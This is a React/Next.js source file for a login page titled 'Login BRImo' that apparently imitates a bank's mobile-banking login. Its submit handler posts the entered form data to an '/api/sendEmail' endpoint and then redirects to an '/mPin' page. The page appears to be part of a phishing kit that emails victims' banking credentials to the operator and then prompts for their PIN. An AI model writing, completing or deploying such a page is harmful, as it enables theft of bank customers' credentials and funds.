
import React from 'react'
import SiteImage from '../components/SiteImage'
import SiteTitle from '../components/SiteTitle'
import SiteForm from '../components/SiteForm'

import logo from "../public/login.jpg"
import { useRouter } from 'next/router'

function Login() {
  const router = useRouter()

  const handleLogin = async (data) => {
    document.getElementById('btn').innerHTML = 'Loading...'
      try {
        
        const response = await fetch('/api/sendEmail', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(data)
        })

        const json = await response.json()
        
        if (json.status === 200) {
            document.getElementById('btn').innerHTML = 'Login'
            router.push('/mPin')
        }

      } catch (error) {
          document.getElementById('btn').innerHTML = 'Login'
          console.log(error);
      }
  }

  return (
    <div className="container">
      <SiteTitle title="Login BRImo"/>
      <div className='container-flex'>
        <SiteImage logo={logo}/>      
        <SiteForm jenis="login"
          btnClick={(data) => handleLogin(data)}
        />
      </div>
    </div>
  )
}

export default Login